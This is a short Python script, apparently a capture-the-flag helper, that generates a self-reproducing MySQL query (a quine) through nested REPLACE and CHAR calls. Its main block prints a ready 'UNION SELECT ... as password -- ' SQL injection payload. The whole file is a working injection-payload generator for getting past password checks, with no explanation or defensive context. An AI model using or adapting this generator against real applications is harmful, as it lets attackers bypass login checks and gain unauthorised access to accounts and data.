def genMysqlQuine(sql:str,debug:bool=False,tagChar:str="$")->str:
    '''
    $$用于占位
    '''
    tagCharOrd:int = ord(tagChar)
    if debug: 
        print(sql)
    sql = sql.replace('$$',f"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR({tagCharOrd}),$$)")
    text = sql.replace('$$',f'"{tagChar}"').replace("'",'"')
    sql = sql.replace('$$',f"'{text}'")
    if debug: 
        print(sql)
    return sql


if __name__ == "__main__":
    res = genMysqlQuine("UNION SELECT $$ as password -- ",tagChar="%")
    print(res)
